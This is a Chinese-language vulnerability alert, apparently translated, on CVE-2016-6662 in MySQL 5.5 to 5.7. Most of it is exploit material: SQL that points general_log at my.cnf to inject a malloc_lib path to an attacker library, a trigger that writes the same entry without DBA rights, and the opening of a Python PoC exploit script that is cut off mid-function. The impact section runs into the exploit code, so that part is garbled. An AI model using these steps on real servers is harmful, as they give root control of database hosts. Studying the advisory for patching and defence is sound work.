# 【漏洞预警】Mysql代码执行漏洞，可本地提权（含exp，9/13 01点更新）
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
****
**引用**
##
【漏洞预警】Mysql代码执行漏洞，可本地提权（含exp，9/13 01点更新）
【技术分享】CVE-2016-6662-MySQL ‘malloc_lib’变量重写命令执行分析
**  
**
**概要**
Mysql (5.7, 5.6, 和
5.5版本)的所有默认安装配置，包括最新的版本，攻击者可以远程和本地利用该漏洞。该漏洞需要认证访问MYSQL数据库（通过网络连接或者像phpMyAdmin的web接口），以及通过SQL注入利用。
**攻击者成功利用该漏洞可以以ROOT权限执行代码，完全控制服务器。**
**利用条件：首先你要有一个Mysql低权限用户，仅需有FIle权限（例如：虚拟主机通常会提供，因为需要导入导出文件），即可实现Root权限提升，进而控制服务器**
**  
**
**漏洞影响**
MySQL  set global general_log_file = '/etc/my.cnf';
    mysql> set global general_log = on;
    mysql> select '
        '> 
        '> ; injected config entry
        '> 
        '> [mysqld]
        '> malloc_lib=/tmp/mysql_exploit_lib.so
        '> 
        '> [separator]
        '> 
        '> ';
    mysql> set global general_log = off;
**注意：修改配置文件后，会导致mysql重启的时候失败。**
注入后的my.cnf文件包含：
    [mysqld]
    malloc_lib=/tmp/mysql_exploit_lib.so
mysqld_safe也载入配置文件从mysql的data目录，(/var/lib/mysql/my.cnf)，这个功能从mysql
5.7移除，不再加载，所以即使mysql用户没有权限修改/etc/my.cnf，也可以通过下面的文件来加载
    /var/lib/mysql/my.cnf 
    /var/lib/mysql/.my.cnf
即使没有dba权限，也可以通过触发器来覆写文件
    CREATE DEFINER=`root`@`localhost` TRIGGER appendToConf
    AFTER INSERT
       ON `active_table` FOR EACH ROW
    BEGIN
       DECLARE void varchar(550);
       set global general_log_file='/var/lib/mysql/my.cnf';
       set global general_log = on;
       select "
    [mysqld]
    malloc_lib='/var/lib/mysql/mysql_hookandroot_lib.so'
    " INTO void;   
       set global general_log = off;
    END;
    SELECT '....trigger_code...' INTO DUMPFILE /var/lib/mysql/activedb/active_table.TRG'
触发器写入成功后，刷新的时候会载入，比如通过执行一个insert语句来刷新
    INSERT INTO `active_table` VALUES('xyz');
**POC**
****
    ----------[ 0ldSQL_MySQL_RCE_exploit.py ]--------------    #!/usr/bin/python
    # This is a limited version of the PoC exploit. It only allows appending to
    # existing mysql config files with weak permissions. See V) 1) section of 
    # the advisory for details on this vector. 
    #
    # Full PoC will be released at a later date, and will show how attackers could
    # exploit the vulnerability on default installations of MySQL on systems with no
    # writable my.cnf config files available.
    #
    # The upcoming advisory CVE-2016-6663 will also make the exploitation trivial
    # for certain low-privileged attackers that do not have FILE privilege.
    # 
    # See full advisory for details:
    # http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.txt
    #
    # Stay tuned ;)
    intro = """
    0ldSQL_MySQL_RCE_exploit.py (ver. 1.0)
    (CVE-2016-6662) MySQL Remote Root Code Execution / Privesc PoC Exploit
    For testing purposes only. Do no harm.
    Discovered/Coded by:
    Dawid Golunski
    http://legalhackers.com
    """
    import argparse
    import mysql.connector    
    import binascii
    import subprocess
    def info(str):
        print "[+] " + str + "n"
    def errmsg(str):
        print "[!] " + str + "n"
    def shutdown(code):
        if (code==0):
            info("Exiting (code: %d)n" % code)
        else: